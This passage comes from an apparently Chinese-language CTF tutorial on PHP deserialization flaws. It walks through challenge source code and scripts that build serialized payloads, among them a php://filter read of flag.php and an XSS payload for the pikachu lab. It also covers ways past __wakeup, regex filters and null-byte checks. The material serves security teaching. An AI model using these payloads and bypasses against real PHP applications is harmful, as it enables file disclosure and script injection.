class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">解释：</span><br><span class="line">1.?str传参，绕过is_valid() 之后，进行反序列化unserialize(<span class="variable">$str</span>)，</span><br><span class="line">  传入类对象的序列化值，将会触发 __construct() ，最后销毁对象时，会触发 __destruct()</span><br><span class="line">2. __construct() 对变量初始化操作</span><br><span class="line">3. __destruct() op值对比：2的话强制转换成1；</span><br><span class="line">4.调用process()函数</span><br><span class="line">5.op == <span class="string">&quot;1&quot;</span>为写内容；op == <span class="string">&quot;2&quot;</span>为读取内容</span><br><span class="line">6.我们需要读取到 flag.php文件当中的内容，应该越过 3. 中对op的检测</span><br><span class="line">  可以使用 弱类型绕过 op=空格2 或者是 op=数字2 来越过===</span><br><span class="line">7.这样即使使用的不是字符串2，也可以满足==的条件，从而读取到内容</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>; <span class="comment">//空格 2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:2:&quot; 2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure><p><strong>易错：</strong></p><p>​        <em><em>protected权限的变量在序列化的时会有%00</em>%00字符</em>*，%00字符的ASCII码为0，就无法通过上面的 is_valid函数校验。</p><p><strong>解决办法1：</strong> <strong>php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    public <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    public <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = new FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>解决办法2：</strong> <strong>%00更改为 \00，s 更改为 S</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = urlencode(serialize(<span class="variable">$flag</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//将所得到的内容中 %00更改为 \00，s 更改为 S</span></span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3BS%3A2%3A%22+2%22%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><p><strong>pikachu</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = unserialize(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$unser</span> = <span class="keyword">new</span> S();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$unser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="1-5-2-“百度杯”CTF比赛-十月场"><a href="#1-5-2-“百度杯”CTF比赛-十月场" class="headerlink" title="1.5.2 “百度杯”CTF比赛 十月场"></a>1.5.2 “百度杯”CTF比赛 十月场</h3><p><a href="https://www.ichunqiu.com/battalion?t=1&r=54967">题目链接</a></p><p>index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb</p><p>查看源代码</p><p><img src="https://i.loli.net/2021/09/10/XohASq2FvtG3Q4C.png" alt="image-20210910214204513"></p><p>进行 md5 解密，得到  <em>kkkkkk01123</em> </p><p>则 <code>$key=</code></p><p>根据题目，不能使 ?key=123</p><p>则我们传入 ?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6</p><p>得到 next step is Gu3ss_m3_h2h2.php</p><p>然后我们访问 Gu3ss_m3_h2h2.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo &#123;</span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>) &#123;</span><br><span class="line">            //the secret is <span class="keyword">in</span> the f15g_1s_here.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">&#x27;Gu3ss_m3_h2h2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        die(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize(<span class="variable">$var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;Gu3ss_m3_h2h2.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="1-6-反序列化绕过技巧"><a href="#1-6-反序列化绕过技巧" class="headerlink" title="1.6 反序列化绕过技巧"></a>1.6 反序列化绕过技巧</h2><h3 id="1-6-1-php7-1-反序列化对类属性不敏感"><a href="#1-6-1-php7-1-反序列化对类属性不敏感" class="headerlink" title="1.6.1 php7.1+反序列化对类属性不敏感"></a>1.6.1 php7.1+反序列化对类属性不敏感</h3><p>测试环境：php7.2.9</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class <span class="built_in">test</span>&#123;</span><br><span class="line">    protected <span class="variable">$a</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span>  <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/zupN4kL8dmvtAEK.png" alt="image-20210910173603013"></p><p>可以看到，即是 a 没有<code>%00*%00</code></p><p>也输出了 <code>abc</code></p><h3 id="1-6-2-wakeup-绕过"><a href="#1-6-2-wakeup-绕过" class="headerlink" title="1.6.2 __wakeup() 绕过"></a>1.6.2 <code>__wakeup()</code> 绕过</h3><p><strong>在反序列化字符串时，序列化字符串中属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行 。</strong></p><p>环境： PHP5 &lt; 5.6.2   PHP7 &lt; 7.0.10</p><p>测试：php5.2.17</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$b = new test();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br><span class="line"><span class="comment">//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;aaa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//属性个数 为 真实个数值  1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//属性个数 3 &gt; 真实个数值 1</span></span><br><span class="line">unserialize(<span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/10/ZmtHakew1TCRDVr.png" alt="image-20210910175548494"></p><h3 id="1-6-3-正则绕过"><a href="#1-6-3-正则绕过" class="headerlink" title="1.6.3 正则绕过"></a>1.6.3 正则绕过</h3><p><code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><p>其中的 \d 匹配的是数字 [0-9]，其目的就是检测我们的字符串是否是对象字符串开头</p><p><strong>绕过1：<code>+</code> 绕过 (url 中传参使用 编码 %2b)</strong></p><p><strong>绕过2：<code>serialize(array(a))</code> 绕过  //a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</strong></p><p>测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">unserialize(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line">unserialize(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="1-6-4-十六进制绕过字符过滤"><a href="#1-6-4-十六进制绕过字符过滤" class="headerlink" title="1.6.4 十六进制绕过字符过滤"></a>1.6.4 十六进制绕过字符过滤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;s:4:<span class="string">&quot;%00*%00a&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span class="line">可以写成</span><br><span class="line">O:4:<span class="string">&quot;test&quot;</span>:2:&#123;S:4:<span class="string">&quot;\00*\00\61&quot;</span>;s:3:<span class="string">&quot;abc&quot;</span>;s:7:<span class="string">&quot;%00test%00b&quot;</span>;s:3:<span class="string">&quot;def&quot;</span>;&#125;</span><br><span 